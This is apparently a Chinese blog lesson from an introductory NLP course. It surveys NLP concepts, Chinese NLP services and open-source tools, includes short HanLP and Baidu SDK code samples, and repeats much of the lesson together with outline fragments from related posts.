2、现场提供专业服务，包括系统、大数据集群故障分析与诊断，数据分析服务，业务应用对接迁移，完善提供整体解决方案。
3、实现在单机与分布式环境下发掘等短文本的兴趣倾向和命名实体识别。该项目对结构化数据进行分词，停用词处理，命名实体识别，图计算等操作。
目前在西安知盛数据科技有限公司主要负责大健康平台中医疗健康保险的部分内容构建与实施，主要负责包括数据理解，数据接入与清洗，描述性统计分析，大数据可视化等方面的工作与探索。对自然语言处理，保险数据异常检测方面有独到的探索经验。


本节课程导览
本小结主要介绍内容如下

自然语言处理简介

3W，发展历程、研究现状、


课程涵盖的主要内容总览

第一阶段
第二阶段


知名NLP服务系统与开源组件简介

对汉语自然处理的服务提供商及其服务内容做一个简单的梳理，让大家能够更好的了解目前的技术手段，技术现状。



本小节课程主要内容分为2大部分：
第一部分，自然语言处理简介，用认知思维的方法，结合发展历程总揽自然语言处理.
同时顺带介绍，本课程的主要内容，本课程的主要内容我们分成两个阶段 。第一个阶段如思维导图的右边，我们力求短时间内上手，完成爬虫、分词、可视化、文本分类4个自然语言处理实战中最经常碰到的问题，我首先通过爬虫爬取自己CSDN的博客积累语料，其次尝试通过一些解决方案的对比，比如不同的分词组件的对比，选择一个进行可视化词云，主题模型的生成。最后我们介绍一些文本分类的方法，文本分类的应用较广，如垃圾邮件检测，舆论分析，文本查重等场景都可以转化为文本分类问题。第二个阶段的课程，如果有时间的话，我们来共同探讨一些业界常用的NLP实战场景，如脑图左侧所示的，命名实体识别，问答机器人，知识图谱，基于深度学习的NLP 等
第二部分介绍 ，NLP技术在我国的应用现状，以及一些我们经常用到的开源包。

1.自然语言处理（NLP）简介

上学的时候，老师经常使用这样提问的方式加深我们对于知识的理解和认知
what is it？
自然语言处理（Natural Language Processing，简称 NLP）是人工智能和语言学交叉领域下的分支学科。
用于分析、理解和生成自然语言，以方便人和计算机设备进行交流，以及人与人之间的交流
NLP 是人工智能和语言学领域的交叉学科，
自然语言处理在广义上分为两大部分：

第一部分为自然语言理解，是指让计算机懂人类的语言。
第二部分为自然语言生成，是指把计算机数据转化为自然语言。

NLP 技术按照由浅入深可以分为三个层次，分别为：

基础技术
核心技术
NLP+


1.1 基础技术
这三个层次中，基础技术主要是对自然语言中的基本元素进行表示和分析，比如词汇，短语，句子。
词汇短语分析中，大家熟知的分词技术，就是为了解决如下问题，比如：我去北京大学玩，北京大学独立成词，而不是分成北京和大学。
句法语义分析：对于给定的句子，进行分词、词性标记、命名实体识别和链接、句法分析、语义角色识别和多义词消歧。
1.2 NLP 核心技术
NLP 的核心技术是建立在基础技术之上的的技术产出，基础技术中如词法，句法的分析越准确，核心技术的产出才能越准确。核心技术主要包括以下几个方面：


信息抽取
从给定文本中抽取重要的信息，比如，时间、地点、人物、事件、原因、结果、数字、日期、货币、专有名词等等。通俗说来，就是要了解谁在什么时候、什么原因、对谁、做了什么事、有什	么结果。涉及到实体识别、时间抽取、因果关系抽取等关键技术。


文本挖掘（或者文本数据挖掘）
包括文本聚类、分类、信息抽取、摘要、情感分析以及对挖掘的信息和知识的可视化、交互式的表达界面。目前主流的技术都是基于统计机器学习的。


机器翻译
把输入的源语言文本通过自动翻译获得另外一种语言的文本。根据输入媒介不同，可以细分为文本翻译、语音翻译、手语翻译、图形翻译等。机器翻译从最早的基于规则的方法到二十年前的基于统计的方法，再到今天的基于神经网络（编码-解码）的方法，逐渐形成了一套比较严谨的方法体系。


信息检索
对大规模的文档进行索引。可简单对文档中的词汇，赋之以不同的权重来建立索引，也可利用（句法分析，信息抽取，文本发掘）来建立更加深层的索引。在查询的时候，对输入的查询表达式比如一个检索词或者一个句子进行分析，然后在索引里面查找匹配的候选文档，再根据一个排序机制把候选文档排序，最后输出排序得分最高的文档。


1.3 NLP+（高端技术）
能够真正影响我们生活的黑科技，能够通过图灵测试的机器问答系统，我们可以称之为NLP+


问答系统
对一个自然语言表达的问题，由问答系统给出一个精准的答案。需要对自然语言查询语句进行某种程度的语义分析，包括实体链接、关系识别，形成逻辑表达式，然后到知识库中查找可能的候选答案并通过一个排序机制找出最佳的答案。


对话系统
系统通过一系列的对话，跟用户进行聊天、回答、完成某一项任务。涉及到用户意图理解、通用聊天引擎、问答引擎、对话管理等技术。此外，为了体现上下文相关，要具备多轮对话能力。


AI助手
目前自然语言处理的前沿，已经与人类真假难辨
https://v.qq.com/x/page/w0648xqraxj.html


参考：
https://www.zhihu.com/question/19895141/answer/149475410

1.4 课程涵盖的主要内容总揽


2.知名NLP服务系统与开源组件简介
以下我们通过一些知名中文NLP服务提供商，包括我们熟知的云服务提供商BAT ,aws，以及两家科研院所的系统简介，来介绍以及宏观认识NLP的各种技术手段和应用场景。
首先介绍的是两家NLP基础分析，准确率很高的科研院所 的产品，源自北理工和哈工大，之后我们介绍知名云服务提供商的产品。
2.1 单一服务提供商
2.1.1 汉语分词系统ICTCLAS
主页：http://ictclas.nlpir.org/
在线演示系统：http://ictclas.nlpir.org/
Python版本：https://github.com/tsroten/pynlpir
（需要频繁更新key）
https://blog.csdn.net/sinat_26917383/article/details/77067515

对于**** 这篇新闻稿 的实体抽取结果
http://news.163.com/18/0715/14/DMOTHJEK000189FH.html
该系统为汉语自然语言处理领域顶尖大牛，北京理工大学张华平博士20年的专业技术积累，NShort 革命性分词算法的发明者。
主要功能包括中文分词；英文分词；中英文混合分词，词性标注；命名实体识别；新词识别；关键词提取；支持用户专业词典与微博分析。NLPIR系统支持多种编码、多种操作系统、多种开发语言与平台。
该平台的特点为：功能丰富，分词，语义，实体发现准确率高，近期发布了最新的2018版。
（与熟知的jieba，ltp，清华thulac）
2.1.2 哈工大语言云（Language Technology Platform，LTP）
https://www.ltp-cloud.com/
源自哈工大知名的分词插件ltp，准确率高
Python版本：https://github.com/HIT-SCIR/pyltp

语言技术平台（Language Technology Platform，LTP）是哈工大社会计算与信息检索研究中心历时十年开发的一整套中文语言处理系统。LTP制定了基于XML的语言处理结果表示，并在此基础上提供了一整套自底向上的丰富而且高效的中文语言处理模块（包括词法、句法、语义等6项中文处理核心技术），以及基于动态链接库（Dynamic Link Library, DLL）的应用程序接口、可视化工具，并且能够以网络服务（Web Service）的形式进行使用。
“语言云”
以哈工大社会计算与信息检索研究中心研发的 “语言技术平台（LTP）” 为基础，为用户提供高效精准的中文自然语言处理云服务。 使用 “语言云” 非常简单，只需要根据 API 参数构造 HTTP 请求即可在线获得分析结果，而无需下载 SDK 、无需购买高性能的机器，同时支持跨平台、跨语言编程等。 2014年11月，哈工大联合科大讯飞公司共同推出 “哈工大-讯飞语言云”，借鉴了讯飞在全国性大规模云计算服务方面的丰富经验，显著提升 “语言云” 对外服务的稳定性和吞吐量，为广大用户提供电信级稳定性和支持全国范围网络接入的语言云服务，有效支持包括中小企业在内开发者的商业应用需要。
有关更多语言云API的使用方法，请参考：http://www.ltp-cloud.com/document/
windows 下安装pyltp的话，应该是需要安装visual studio, 由于LTP是用c++写的，pyltp也是基于它封装而成的，需要调用 cl.exe 完成源码的编译。然后下载源码，使用python setup.py install 的方式进行安装就可以了。
2.1.3 HanLP
HanLP是一系列模型与算法组成的NLP工具包，由大快搜索主导并完全开源，目标是普及自然语言处理在生产环境中的应用。HanLP具备功能完善、性能高效、架构清晰、语料时新、可自定义的特点。
HanLP提供下列16大类功能：

中文分词
词性标注
命名实体识别
关键词提取
自动摘要
短语提取
拼音转换
简繁转换
文本推荐
依存句法分析
文本分类
情感分析
文本聚类
word2vec
文档语义相似度计算
语料库工具

项目地址：https://github.com/hankcs/HanLP
python 版本：https://github.com/hankcs/pyhanlp
windows 安装指南：https://github.com/hankcs/pyhanlp/wiki/Windows
由于HanLP底层是java 版本的，所以对java 的支持比较好，python 版本中有一些功能没有实现，但可以通过调用java 实现。HanLP随v1.6.8发布了在一亿字的大型综合语料库上训练的分词模型，该语料是已知范围内全世界最大的中文分词语料库。在HanLP的在线演示中使用已久，现在无偿公开。语料规模决定实际效果
，所以不用多说HanLP确实可以直接拿来做项目。有趣的是HanLP 有着非常多的衍生项目，其中docker 版和ES 版值得大家关注，这些衍生项目无疑更加提高了HanLP的可用性、灵活性。
调用代码样例

from pyhanlp import *

print(HanLP.segment('你好，欢迎在Python中调用HanLP的API'))
for term in HanLP.segment('下雨天地面积水'):
    print('{}\t{}'.format(term.word, term.nature)) # 获取单词与词性
testCases = [
    "商品和服务",
    "结婚的和尚未结婚的确实在干扰分词啊",
    "买水果然后来世博园最后去世博会",
    "中国的首都是北京",
    "欢迎新老师生前来就餐",
    "工信处女干事每月经过下属科室都要亲口交代24口交换机等技术性器件的安装工作",
    "随着页游兴起到现在的页游繁盛，依赖于存档进行逻辑判断的设计减少了，但这块也不能完全忽略掉。"]
for sentence in testCases: print(HanLP.segment(sentence))
# 关键词提取
document = "水利部水资源司司长陈明忠9月29日在国务院新闻办举行的新闻发布会上透露，" \
           "根据刚刚完成了水资源管理制度的考核，有部分省接近了红线的指标，" \
           "有部分省超过红线的指标。对一些超过红线的地方，陈明忠表示，对一些取用水项目进行区域的限批，" \
           "严格地进行水资源论证和取水许可的批准。"
print(HanLP.extractKeyword(document, 2))
# 自动摘要
print(HanLP.extractSummary(document, 3))
# 依存句法分析
print(HanLP.parseDependency("徐先生还具体帮助他确定了把画雄鹰、松鼠和麻雀作为主攻目标。"))

2.1.4 BosonNLP
BosonNLP(界面，接口友好，准确率高)
https://bosonnlp.com/demo

如果你在网上搜索汉语分词评测，十有八九你会搜索到专注于汉语自然语言处理技术的这家公司，以及下面这张评测结果：


2.2 云服务提供商
2.2.1 Amazon Comprehend

https://amazonaws-china.com/cn/comprehend/?nc2=h_a1
Amazon Comprehend 是一项自然语言处理 (NLP) 服务，可利用机器学习发现文本中的见解和关系。Amazon Comprehend 可以识别文本语言，提取关键的短语、地点、人物、品牌或事件，了解文本的含义是肯定还是否定，还可以自动按主题整理一系列文本文件。
您可使用 Amazon Comprehend API 分析文本，并将结果进行广泛应用，包括客户意见分析、智能文档搜索以及 Web 应用程序的内容个性化设置。
该服务不断地通过各种信息来源 (包括世界上最大的自然语言数据集之一：Amazon.com 商品描述和买家评论) 学习和提升，	以跟上语言的发展演变。
实例：利用 AWS Comprehend 打造近实时文本情感分析
https://amazonaws-china.com/cn/blogs/china/realizing-near-real-time-text-sentiment-analysis-with-aws-comprehend/
可以看到图中，aws 使用kibana 仪表盘和 Comprehend 服务组成了一个实时的电影评论实时分析系统，其实主要功能就是实现了分词和内容来源的地理位置统计，看起来很炫酷。
2.2.2 阿里云NLP

https://data.aliyun.com/product/nlp?spm=5176.8142029.388261.396.63f36d3eoZ8kNK
阿里的NLP  服务简介为：
自然语言处理是为各类企业及开发者提供的用于文本分析及挖掘的核心工具，
已经广泛应用在电商、文化娱乐、金融、物流等行业客户的多项业务中。

自然语言处理API可帮助用户搭建内容搜索、内容推荐、舆情识别及分析、文本结构化、对话机器人等智能产品，
也能够通过合作，定制个性化的解决方案。

按量付费的基准价，在没有购买资源包或资源包用尽的情况下，将按基准价进行计费。
其中，基础版对每个主帐号提供每日5万次的免费使用额度。商品评价解析没有免费额度。
值得注意的是阿里云的nlp 服务刚发布不到1年，应该算是领域内的新手，语料库应该和aws 一样，主要为商品描述和评论，所以它有一项功能叫做商品评价解析

时隔半年之后我们再来看一下这个产品名录发现，功能更加丰富了。整体来看受限于语料的积累，我认为没有什么亮点。

2.2.3 腾讯云NLP


https://cloud.tencent.com/product/nlp
界面友好，功能丰富，语料库为海量综合性语料库
腾讯云智在线演示系统
http://nlp.qq.com/semantic.cgi
2.2.4 百度语言处理基础技术

http://ai.baidu.com/tech/nlp
依托海量检索数据，并且搜索引擎本身就是NLP 最终的结果产出，所以在NLP领域，百度无论是语料库丰富程度，技术先进性，以及服务多样性等都是遥遥领先其他厂家，基本上可以算作是中文NLP服务提供商的业界最佳实践。


功能丰富且技术领先

词法分析
词向量表示
词义相似度
评论观点抽取
文章标签
依存句法分析
DNN语言模型
短文本相似度
情感倾向分析
文章分类
对话情绪识别
文本纠错
新闻摘要



等13个大类的服务,对于个人开发者来说，配比了免费额度，对于词向量来说，每秒免费的额度是5个词，基本可以够用拿来做点有趣的事情了。
从图中结果也可以看出，百度对词向量相似度的分析和我用余弦相似度的结果一样，可以推断出百度的算法比较接地气。

DNN语言模型

Deep Neural Network（DNN）模型是基本的深度学习框架，DNN语言模型是通过计算给定词组成的句子的概率，从而判断所组成的句子是否符合客观语言表达习惯
通常用于机器翻译、拼写纠错、语音识别、问答系统、词性标注、句法分析和信息检索等
百度这个模型是大厂中首个公开提供服务接口的深度学习语言模型。

调用方式友好简单

提供更加简单的调用方式：类似aws boto3
如果已安装pip，执行pip install baidu-aip即可
Sdk 方式，安装
from aip import AipNlp
 """ 你的 APPID AK SK """ 
APP_ID = '你的 App ID' 
API_KEY = '你的 Api Key' 
SECRET_KEY = '你的 Secret Key' 
client = AipNlp(APP_ID, API_KEY, SECRET_KEY)

word = "张飞"
 """ 调用词向量表示 """ 
client.wordEmbedding(word);


2.3 NLP开源组件简介
NLP 领域有非常多的开源组件可以用来快速构建开发的原型，我来简单介绍以下四个知名开源组件
2.3.1 NLTK
http://www.nltk.org/

最常用的自然语言处理库
NLTK是一个高效的Python构建的平台，用来处理人类自然语言数据。基本包含了NLP 中需要用到的所有技术。
它提供了易于使用的接口，通过这些接口可以访问超过50个语料库和词汇资源（如WordNet），还有一套用于分类、标记化、词干标记、解析和语义推理的文本处理库，以及工业级NLP库的封装器和一个活跃的讨论论坛。
古腾堡项目（Project Gutenberg）
NLTK 包含古腾堡项目（Project Gutenberg）中电子文本档案的经过挑选的一小部分文本。该项目大约有57,000 本免费电子图书，放在http://www.gutenberg.org/上。我们先要用Python 解释器加载NLTK 包，然后尝试nltk.corpus.gutenberg.fileids()，当然其中的中文语料也很丰富（都是没有版权的免费文档），比如李白文集，三字经，百家姓等等（要是用这些训练中文模型效果可想而知）

2.3.2 Jieba分词
https://github.com/fxsjy/jieba
“结巴”中文分词：做最好的 Python 中文分词组件
“Jieba” (Chinese for “to stutter”) Chinese text segmentation: built to be the best Python Chinese word segmentation module.
实现基本功能的代码量在一千行左右，词典长度35w ，安装方式友好，简洁，高效，（但准确性已经跟不上时代！！！85%）
2.3.3 ICTCLAS
http://ictclas.nlpir.org/
主要功能包括中文分词；词性标注；中英混合分词；命名实体识别；用户词典功能；支持GBK编码、UTF8编码、BIG5编码。新增微博分词、新词发现与关键词提取；张华平博士先后倾力打造20余年，内核升级10次。
全球用户突破20万，先后获得了2010年钱伟长中文信息处理科学技术奖一等奖，2003年国际SIGHAN分词大赛综合第一名，2002年国内973评测综合第一名。
2.3.4 Gensim
https://radimrehurek.com/gensim/
它的 slogan 是：Topic modelling for humans.
Gensim提供了一个发现文档语义结构的工具，用于从原始的非结构化的文本中，无监督地学习到文本隐层的主题向量表达。它将语料（Corpus）向量化表示后，主要能够实现以下三个功能：

建立语言模型
词嵌入模型的训练
检索和语义分析的神器

简介参考：https://www.cnblogs.com/iloveai/p/gensim_tutorial.html

参考文献
我爱自然语言处理
http://www.52nlp.cn/
深度学习与中文短文本分析总结与梳理
https://blog.csdn.net/wangyaninglm/article/details/66477222
分析了近5万首《全唐诗》，发现了这些有趣的秘密
http://www.growthhk.cn/cgo/9542.html
万字干货｜10款数据分析“工具”，助你成为新媒体运营领域的“增长黑客”
http://www.woshipm.com/data-analysis/553180.html
jieba分词简介与解析
https://www.cnblogs.com/baiboy/p/jieba2.html
有哪些好的汉语分词方案
https://www.zhihu.com/question/19578687
基于分布式的短文本命题实体识别之----人名识别（python实现）
https://blog.csdn.net/wangyaninglm/article/details/75042151
NLP技术的应用及思考
https://yq.aliyun.com/articles/78031










我们平时做自然语言处理，机器学习，都是希望能够有丰富的训练数据集，这样才能获取质量上乘的模型。在大数据时代，处理数据已经不再是是问题了，spark，hadoop ，Elastic search提供了海量甚至巨量的分布式数据处理方法。问题是没有数据怎么办？在合理合法 的前提下自然语言处理 的语料和其他机器学习模型训练数据需要的图片等等各类数据，我们其实都是可以通过网络爬虫的方式进行积累的。
文章大纲1. 网络爬虫1.1 网络爬虫的合法性1.2 网络爬虫前置技术1.3 目标网站进行调研1.3.1 robots.txt1.3.2 网站所使用的技术1.3.3 网站地图1.3.4 估算网站大小1.3.5 网站所有者1.4 网络爬虫的通用流程1.5 爬取脚本样例参考文献
 









本文为《自然语言处理实战入门》第3课
对应课程：https://edu.csdn.net/course/play/20769/259543
文章大纲1.python 开发简介1.1 python 集成开发环境1.1.1 pycharm1.1.2 spyder1.1.3 jupyter notebook1.1.4 jupyter lab1.1.5 Colaboratory1.2 python虚拟环境准备1.2.1 Anaconda1.2.2 虚拟环境与包管理1.2.3 conda 









未完待续
文章大纲语料收集语料库《自然语言处理入门与实战》语料库汉语标注语料库网络收集资料合集清华大学北京大学语料库在线（教育部语言文字应用研究所计算语言学研究室）大规模中文自然语言处理语料搜狗实验室中英文NLP 差异公开数据集ChineseNlpCorpus[^2]文本分类新闻分类 










文章大纲本节课程导览1.自然语言处理（NLP）简介1.1  NLP 前置技术1.2 NLP 基础技术1.3 NLP 核心技术1.4 NLP+（高端技术）1.5 NLP主要内容总揽2.知名NLP服务系统与开源组件简介2.1 单一服务提供商2.1.1 汉语分词系统ICTCLAS2.1.2 哈工大语言云（Language Technology Platform，LTP）2.1.3 HanLP2.1.4 BosonNLP2.2 云服务提供商2.2.1 Amazon Comprehend2.2.2 阿里云NLP2.2.3 腾讯云NLP2.2.4 百度语言处理基础技术2.3 NLP开源组件简介2.3.1 NLTK2.3.2 Jieba分词2.3.3 ICTCLAS2.3.4 Gensim参考文献

大家好，今天开始和大家分享，我在自然语言处理（Natural Language Processing，NLP）的一些学习经验和心得体会。
随着人工智能的快速发展，自然语言处理和机器学习技术的应用愈加广泛。为使大家对该领域整体概况有一个系统、明晰的认识，同时入门一些工程实践，也借CSDN为NLP的学习，开发者们搭建一个交流的平台。我希望能够通过这个专栏《自然语言处理实战入门》和广大NLP爱好者一起学习自然语言处理技术，分享学习资料，打破NLP 技术 的实战应用壁垒。
如您购买了专栏，更多资料请参照博客左侧的联系方式加群分享：
QQ交流群：  593683975
QQ群提供技术交流，CSDN资源，百度文库等资源共享
加群需要回答问题：抛硬币正面上的期望？ 请给出您的答案

本节课程导览
本小结主要介绍内容如下

自然语言处理简介

3W，发展历程、研究现状、


课程涵盖的主要内容总览

第一阶段
第二阶段


知名NLP服务系统与开源组件简介

对汉语自然处理的服务提供商及其服务内容做一个简单的梳理，让大家能够更好的了解目前的技术手段，技术现状。



本小节课程主要内容分为2大部分：
第一部分，自然语言处理简介，用认知思维的方法，结合发展历程总揽自然语言处理.
同时顺带介绍，本课程的主要内容，本课程的主要内容我们分成两个阶段 。第一个阶段如思维导图的右边，我们力求短时间内上手，完成爬虫、分词、可视化、文本分类4个自然语言处理实战中最经常碰到的问题，我首先通过爬虫爬取自己CSDN的博客积累语料，其次尝试通过一些解决方案的对比，比如不同的分词组件的对比，选择一个进行可视化词云，主题模型的生成。最后我们介绍一些文本分类的方法，文本分类的应用较广，如垃圾邮件检测，舆论分析，文本查重等场景都可以转化为文本分类问题。第二个阶段的课程，如果有时间的话，我们来共同探讨一些业界常用的NLP实战场景，如脑图左侧所示的，命名实体识别，问答机器人，知识图谱，基于深度学习的NLP 等
第二部分介绍 ，NLP技术在我国的应用现状，以及一些我们经常用到的开源包。

1.自然语言处理（NLP）简介

上学的时候，老师经常使用这样提问的方式加深我们对于知识的理解和认知
what is it？
自然语言处理（Natural Language Processing，简称 NLP）是人工智能和语言学交叉领域下的分支学科。
用于分析、理解和生成自然语言，以方便人和计算机设备进行交流，以及人与人之间的交流
NLP 是人工智能和语言学领域的交叉学科，
自然语言处理在广义上分为两大部分：

第一部分为自然语言理解，是指让计算机懂人类的语言。
第二部分为自然语言生成，是指把计算机数据转化为自然语言。

NLP 技术按照由浅入深可以分为三个层次，分别为：

基础技术
核心技术
NLP+


1.1  NLP 前置技术
我们来说说最重要的两个前置技术：
1.正则表达式
2.网络爬虫
这两个技术主要是对应我们语料的处理。
1.2 NLP 基础技术
这三个层次中，基础技术主要是对自然语言中的基本元素进行表示和分析，比如词汇，短语，句子。
词汇短语分析中，大家熟知的分词技术，就是为了解决如下问题，比如：我去北京大学玩，北京大学独立成词，而不是分成北京和大学。
句法语义分析：对于给定的句子，进行分词、词性标记、命名实体识别和链接、句法分析、语义角色识别和多义词消歧。
1.3 NLP 核心技术
NLP 的核心技术是建立在基础技术之上的的技术产出，基础技术中如词法，句法的分析越准确，核心技术的产出才能越准确。核心技术主要包括以下几个方面：


信息抽取
从给定文本中抽取重要的信息，比如，时间、地点、人物、事件、原因、结果、数字、日期、货币、专有名词等等。通俗说来，就是要了解谁在什么时候、什么原因、对谁、做了什么事、有什	么结果。涉及到实体识别、时间抽取、因果关系抽取等关键技术。


文本挖掘（或者文本数据挖掘）
包括文本聚类、分类、信息抽取、摘要、情感分析以及对挖掘的信息和知识的可视化、交互式的表达界面。目前主流的技术都是基于统计机器学习的。


机器翻译
把输入的源语言文本通过自动翻译获得另外一种语言的文本。根据输入媒介不同，可以细分为文本翻译、语音翻译、手语翻译、图形翻译等。机器翻译从最早的基于规则的方法到二十年前的基于统计的方法，再到今天的基于神经网络（编码-解码）的方法，逐渐形成了一套比较严谨的方法体系。


信息检索
对大规模的文档进行索引。可简单对文档中的词汇，赋之以不同的权重来建立索引，也可利用（句法分析，信息抽取，文本发掘）来建立更加深层的索引。在查询的时候，对输入的查询表达式比如一个检索词或者一个句子进行分析，然后在索引里面查找匹配的候选文档，再根据一个排序机制把候选文档排序，最后输出排序得分最高的文档。


1.4 NLP+（高端技术）
能够真正影响我们生活的黑科技，能够通过图灵测试的机器问答系统，我们可以称之为NLP+


问答系统
对一个自然语言表达的问题，由问答系统给出一个精准的答案。需要对自然语言查询语句进行某种程度的语义分析，包括实体链接、关系识别，形成逻辑表达式，然后到知识库中查找可能的候选答案并通过一个排序机制找出最佳的答案。


对话系统
系统通过一系列的对话，跟用户进行聊天、回答、完成某一项任务。涉及到用户意图理解、通用聊天引擎、问答引擎、对话管理等技术。此外，为了体现上下文相关，要具备多轮对话能力。


AI助手
目前自然语言处理的前沿，已经与人类真假难辨
https://v.qq.com/x/page/w0648xqraxj.html


参考：
自然语言处理怎么最快入门？

1.5 NLP主要内容总揽


2.知名NLP服务系统与开源组件简介
以下我们通过一些知名中文NLP服务提供商，包括我们熟知的云服务提供商BAT ,aws，以及两家科研院所的系统简介，来介绍以及宏观认识NLP的各种技术手段和应用场景。
首先介绍的是两家NLP基础分析，准确率很高的科研院所 的产品，源自北理工和哈工大，之后我们介绍知名云服务提供商的产品。
2.1 单一服务提供商
2.1.1 汉语分词系统ICTCLAS
主页：http://ictclas.nlpir.org/
在线演示系统：http://ictclas.nlpir.org/nlpir/
Python版本：https://github.com/tsroten/pynlpir

语言是人类区别其他动物的本质特性。在所有生物中，只有人类才具有语言能力。人类的多种智能都与语言有着密切的关系。人类的逻辑思维以语言为形式，人类的绝大部分知识也是以语言文字的形式记载和流传下来的。因而，它也是人工智能的一个重要，甚至核心部分。
用自然语言与计算机进行通信，这是人们长期以来所追求的。因为它既有明显的实际意义，同时也有重要的理论意义：人们可以用自己最习惯的语言来使用计算机，而无需再花大量的时间和精力去学习不很自然和习惯的各种计算机语言；人们也可通过它进一步了解人类的语言能力和智能的机制。
实现人机间自然语言通信意味着要使计算机既能理解自然语言文本的意义，也能以自然语言文本来表达给定的意图、思想等。前者称为自然语言理解，后者称为自然语言生成。因此，自然语言处理大体包括了自然语言理解和自然语言生成两个部分。历史上对自然语言理解研究得较多，而对自然语言生成研究得较少。但这种状况已有所改变。

对于百度百科 自然语言处理 的分词及实体抽取结果

该系统为汉语自然语言处理领域顶尖大牛，北京理工大学张华平博士20年的专业技术积累，NShort 革命性分词算法的发明者。
主要功能包括中文分词；英文分词；中英文混合分词，词性标注；命名实体识别；新词识别；关键词提取；支持用户专业词典与微博分析。NLPIR系统支持多种编码、多种操作系统、多种开发语言与平台。
该平台的特点为：功能丰富，分词，语义，实体发现准确率高，近期发布了最新的2018版。
（与熟知的jieba，ltp，清华thulac）
2.1.2 哈工大语言云（Language Technology Platform，LTP）
https://www.ltp-cloud.com/
源自哈工大知名的分词插件ltp，准确率高
Python版本：https://github.com/HIT-SCIR/pyltp

语言技术平台（Language Technology Platform，LTP）是哈工大社会计算与信息检索研究中心历时十年开发的一整套中文语言处理系统。LTP制定了基于XML的语言处理结果表示，并在此基础上提供了一整套自底向上的丰富而且高效的中文语言处理模块（包括词法、句法、语义等6项中文处理核心技术），以及基于动态链接库（Dynamic Link Library, DLL）的应用程序接口、可视化工具，并且能够以网络服务（Web Service）的形式进行使用。
“语言云”
以哈工大社会计算与信息检索研究中心研发的 “语言技术平台（LTP）” 为基础，为用户提供高效精准的中文自然语言处理云服务。 使用 “语言云” 非常简单，只需要根据 API 参数构造 HTTP 请求即可在线获得分析结果，而无需下载 SDK 、无需购买高性能的机器，同时支持跨平台、跨语言编程等。 2014年11月，哈工大联合科大讯飞公司共同推出 “哈工大-讯飞语言云”，借鉴了讯飞在全国性大规模云计算服务方面的丰富经验，显著提升 “语言云” 对外服务的稳定性和吞吐量，为广大用户提供电信级稳定性和支持全国范围网络接入的语言云服务，有效支持包括中小企业在内开发者的商业应用需要。
有关更多语言云API的使用方法，请参考：http://www.ltp-cloud.com/document/
windows 下安装pyltp的话，应该是需要安装visual studio, 由于LTP是用c++写的，pyltp也是基于它封装而成的，需要调用 cl.exe 完成源码的编译。然后下载源码，使用python setup.py install 的方式进行安装就可以了。
2.1.3 HanLP
HanLP是一系列模型与算法组成的NLP工具包，由大快搜索主导并完全开源，目标是普及自然语言处理在生产环境中的应用。HanLP具备功能完善、性能高效、架构清晰、语料时新、可自定义的特点。

HanLP提供下列16大类功能：

中文分词
词性标注
命名实体识别
关键词提取
自动摘要
短语提取
拼音转换
简繁转换
文本推荐
依存句法分析
文本分类
情感分析
文本聚类
word2vec
文档语义相似度计算
语料库工具

项目地址：https://github.com/hankcs/HanLP
python 版本：https://github.com/hankcs/pyhanlp
windows 安装指南：https://github.com/hankcs/pyhanlp/wiki/Windows
由于HanLP底层是java 版本的，所以对java 的支持比较好，python 版本中有一些功能没有实现，但可以通过调用java 实现。HanLP随v1.6.8发布了在一亿字的大型综合语料库上训练的分词模型，该语料是已知范围内全世界最大的中文分词语料库。在HanLP的在线演示中使用已久，现在无偿公开。语料规模决定实际效果
，所以不用多说HanLP确实可以直接拿来做项目。有趣的是HanLP 有着非常多的衍生项目，其中docker 版和ES 版值得大家关注，这些衍生项目无疑更加提高了HanLP的可用性、灵活性。
调用代码样例

from pyhanlp import *

print(HanLP.segment('你好，欢迎在Python中调用HanLP的API'))
for term in HanLP.segment('下雨天地面积水'):
    print('{}\t{}'.format(term.word, term.nature)) # 获取单词与词性
testCases = [
    "商品和服务",
    "结婚的和尚未结婚的确实在干扰分词啊",
    "买水果然后来世博园最后去世博会",
    "中国的首都是北京",
    "欢迎新老师生前来就餐",
    "工信处女干事每月经过下属科室都要亲口交代24口交换机等技术性器件的安装工作",
    "随着页游兴起到现在的页游繁盛，依赖于存档进行逻辑判断的设计减少了，但这块也不能完全忽略掉。"]
for sentence in testCases: print(HanLP.segment(sentence))
# 关键词提取
document = "水利部水资源司司长陈明忠9月29日在国务院新闻办举行的新闻发布会上透露，" \
           "根据刚刚完成了水资源管理制度的考核，有部分省接近了红线的指标，" \
           "有部分省超过红线的指标。对一些超过红线的地方，陈明忠表示，对一些取用水项目进行区域的限批，" \
           "严格地进行水资源论证和取水许可的批准。"
print(HanLP.extractKeyword(document, 2))
# 自动摘要
print(HanLP.extractSummary(document, 3))
# 依存句法分析
print(HanLP.parseDependency("徐先生还具体帮助他确定了把画雄鹰、松鼠和麻雀作为主攻目标。"))

2.1.4 BosonNLP
BosonNLP(界面，接口友好，准确率高)
https://bosonnlp.com/demo

如果你在网上搜索汉语分词评测，十有八九你会搜索到专注于汉语自然语言处理技术的这家公司，以及下面这张评测结果：


2.2 云服务提供商
2.2.1 Amazon Comprehend

https://amazonaws-china.com/cn/comprehend/?nc2=h_a1
Amazon Comprehend 是一项自然语言处理 (NLP) 服务，可利用机器学习发现文本中的见解和关系。Amazon Comprehend 可以识别文本语言，提取关键的短语、地点、人物、品牌或事件，了解文本的含义是肯定还是否定，还可以自动按主题整理一系列文本文件。
您可使用 Amazon Comprehend API 分析文本，并将结果进行广泛应用，包括客户意见分析、智能文档搜索以及 Web 应用程序的内容个性化设置。
该服务不断地通过各种信息来源 (包括世界上最大的自然语言数据集之一：Amazon.com 商品描述和买家评论) 学习和提升，	以跟上语言的发展演变。
实例：利用 AWS Comprehend 打造近实时文本情感分析
https://amazonaws-china.com/cn/blogs/china/realizing-near-real-time-text-sentiment-analysis-with-aws-comprehend/
可以看到图中，aws 使用kibana 仪表盘和 Comprehend 服务组成了一个实时的电影评论实时分析系统，其实主要功能就是实现了分词和内容来源的地理位置统计，看起来很炫酷。
2.2.2 阿里云NLP

https://data.aliyun.com/product/nlp?spm=5176.8142029.388261.396.63f36d3eoZ8kNK
阿里的NLP  服务简介为：
自然语言处理是为各类企业及开发者提供的用于文本分析及挖掘的核心工具，
已经广泛应用在电商、文化娱乐、金融、物流等行业客户的多项业务中。

自然语言处理API可帮助用户搭建内容搜索、内容推荐、舆情识别及分析、文本结构化、对话机器人等智能产品，
也能够通过合作，定制个性化的解决方案。

按量付费的基准价，在没有购买资源包或资源包用尽的情况下，将按基准价进行计费。
其中，基础版对每个主帐号提供每日5万次的免费使用额度。商品评价解析没有免费额度。
值得注意的是阿里云的nlp 服务刚发布不到1年，应该算是领域内的新手，语料库应该和aws 一样，主要为商品描述和评论，所以它有一项功能叫做商品评价解析

